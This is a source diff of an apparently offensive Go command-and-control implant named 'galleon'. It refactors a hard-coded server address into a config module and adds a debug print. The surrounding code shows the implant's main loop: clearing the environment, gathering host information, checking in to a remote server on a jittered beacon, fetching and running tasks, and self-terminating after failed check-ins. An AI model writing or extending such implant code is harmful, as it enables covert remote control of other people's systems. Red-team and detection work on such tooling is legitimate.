@@ -6,6 +6,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"galleon/agent_helper"
+	"galleon/debug"
+	"galleon/agent_config"
 	"os"
 	"time"
 )
@@ -26,6 +28,9 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 }
 
 func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) {
+	if debug.Debug {
+		fmt.Printf("[*] Task Recv: %s\n", taskData["task"])
+	}
 	switch taskData["task"] {
 	case "ls":
 		agent_helper.LsHandler(url, taskData)
@@ -54,18 +59,17 @@ func main() {
 
 	os.Clearenv()
 	retryCounter := 0
-	serverUrl := "https://192.168.15.45:8000"
 	initialInfo := agent_helper.GatherInfo()
 	time.Sleep(time.Duration(agent_helper.CallbackTimer.StartDelay) * time.Second)
-	agent_helper.InitialCheckin(serverUrl, initialInfo)
-	agent_helper.SigHandler(serverUrl, initialInfo.Session)
+	agent_helper.InitialCheckin(agent_config.ServerUrl, initialInfo)
+	agent_helper.SigHandler(agent_config.ServerUrl, initialInfo.Session)
 
 	for {
 		nextInterval := agent_helper.RandomJitter(agent_helper.CallbackTimer.Callback_freq, agent_helper.CallbackTimer.Jitter)
 		timer := time.NewTimer(nextInterval)
 
 		<-timer.C
-		resp, err := agent_helper.CheckIn(serverUrl, initialInfo.Session)
+		resp, err := agent_helper.CheckIn(agent_config.ServerUrl, initialInfo.Session)
 		if err != nil {
 			retryCounter += 1
 			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
@@ -82,10 +86,10 @@ func main() {
 		}
 		if resp == 301 {
 			// we have tasking
-			tasking, err := agent_helper.FetchTasking(serverUrl, initialInfo.Session)
+			tasking, err := agent_helper.FetchTasking(agent_config.ServerUrl, initialInfo.Session)
 			if err != nil {
 			} else {
-				ParseTasks(serverUrl, tasking)
+				ParseTasks(agent_config.ServerUrl, tasking)
 			}
 			continue
 		}
